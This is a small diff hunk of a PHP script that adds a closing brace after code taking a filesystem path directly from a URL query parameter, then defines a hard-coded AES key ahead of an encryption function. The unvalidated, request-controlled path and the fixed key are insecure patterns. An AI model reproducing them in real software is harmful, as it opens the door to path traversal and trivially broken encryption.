@@ -7,7 +7,7 @@ if (isset($_GET['put']) && $_GET['put'] === 'path') {
     $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
     $path = realpath($path);
 
-
+}
 define('AES_KEY', hex2bin('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'));
 
 function aes_encrypt($plaintext)
